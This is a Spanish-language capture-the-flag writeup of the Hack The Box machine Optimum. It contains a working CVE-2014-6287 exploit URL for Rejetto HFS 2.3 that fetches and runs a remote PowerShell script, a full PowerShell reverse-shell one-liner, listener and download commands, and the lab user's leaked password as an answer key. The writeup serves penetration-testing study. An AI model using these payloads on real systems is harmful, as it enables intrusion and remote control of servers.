---
title: Writeup optimum - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - optimum
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina optimum en Hack The Box.
keywords:
  - writeup optimum
  - hack the box optimum
  - resolución máquina optimum
  - optimum hack the box
  - htb optimum
---
-------------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Windows/Optimum)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=4ZEEfXjj5GY)|[Parte2](https://www.youtube.com/watch?v=LQ_cm_2EuHs)|[Parte3](https://www.youtube.com/watch?v=G8tLOBy31OE)
- 🧠 **Explicación resumida**: 

---

#easy #windows #nmap #ping

----
# Guided Mode

1)¿Qué versión de HttpFileServer se está ejecutando en el puerto TCP 80?
	2.3

2)¿Cuál es el ID CVE de 2014 para una vulnerabilidad de ejecución remota de código en la función findMacroMarker de la versión 2.3 de HttpFileServer?
	[[CVE-2014-6287]]

3)¿Con qué usuario se ejecuta el servidor web? Indique el nombre de usuario sin el dominio.
	kostas

*La pregunta anterior era la flag de user.txt*
5)Pregunta opcional: ¿Cuál es la contraseña del usuario kostas?
	kdeEjDowkS*

6)¿Qué módulo de reconocimiento de Metasploit se puede utilizar para enumerar las posibles rutas de escalada de privilegios en un sistema comprometido?
	local_exploit_suggester


--------

# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.8
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.8 -oG allPorts
nmap -sCV -p80 10.10.10.8 -oN target
```

![[Optimum1.png]]![[Optimum2.png]]
*TTL:* Maquina Windows
*Puertos:*
	`80` HTTP
*Datos importantes:*
	En el puerto 80 esta corriendo el servicio httpd 2.3

---------
# [[Whatweb-wappalyzer]] y [[Gobuster]]

```shell
whatweb http://10.10.10.8
```

![[Optimum3.png]]

![[Optimum4.png]]
Nos vuelve a informar que es un httpserver, como el escaneo de *NMAP*

-------
# Enumeracion y busqueda del [[CVE-2014-6287]]

Buscando en google *httpd 2.3 vulnerability* me encontre que se llama rejetto el nombre del software para compartir archivos a traves de http
![[Optimum5.png]]
Y recorde que haciendo click en esa parte de abajo a la derecha me mandaba a la pagina de https://www.rejetto.com/hfs/
![[Optimum6.png]]

-------------
# Explotacion [[CVE-2014-6287]] y [[Reverse shell]]

Vamos a crear un archivo reverse.ps1 con el siguiente payload. Esto lo sacamos de [payloadallthethings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell)

![[Optimum10.png]]
Vamos a usar el script de [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) para mandarnos la [[Reverse shell]]

```ps1
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


Vamos a estar hosteando el archivo con un server de [[python3 -m http.server]] con el comando `python3 -m http.server 80` para que se descarge el archivo *reverse.ps1* con el cual vamos a inyectar el payload

![[Optimum9.png]]
Mientras estamos en escucha con [[rlwrap nc -lvnp 443]] 

Ejecutamos la vulnerabilidad mediante este link, solamente cambiando la ip desde la cual se va a descargar el archivo

`http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(%27http%3a//10.10.16.15/reverse.ps1%27).}`

![[Optimum7 1.png]]
Ya estamos adentro de la maquina

-------
# Opcional Enumeracion con [[WinPEAS]] y contraseña del usuario kostas

Usamos el comando [[systeminfo]]
![[Optimum11.png]]
Y podemos ver que es un *Windows Server 2012 R2 Standard* de 64 bits

Vamos a hacernos un [[python3 -m http.server]] con el comando `python3 -m http.server 80` en el directorio que tengamos el [[WinPEAS]]

Luego desde la maquina victima vamos a descargarlo con [[wget]] usando el comando `wget http://10.10.16.15/winPEASx64.exe -outfile winPEASx64.exe` 
![[Optimum12.png]]
Para posteriormente ejecutarlo `./winPEASx64 > win` mandando el output a un archivo que se llame *win* una vez que pase un tiempo y termine el escaneo, vamos a abrir con [[type]] el archivo *win* con el comando `type win`

Y vemos estas credenciales de Autologon, asi que ya tenemos la contraseña del usuarios kostas
![[Optimum13.png]]
kostas:kdeEjDowkS*

-----------
# Escalada de privilegios


https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit




![[Optimum8.png]]


-------
# Notas

Un servidor HTTP de archivos, también conocido como HFS (HTTP File Server), es una herramienta que permite a los usuarios compartir archivos a través de un protocolo HTTP

-------
# Creditos
Nos ayudamos de [[searchsploit]] con el comando `searchsploit -m windows/webapps/49125.py` y vimos este exploit para guiarnos
[Writeup de 0xdf] (https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)
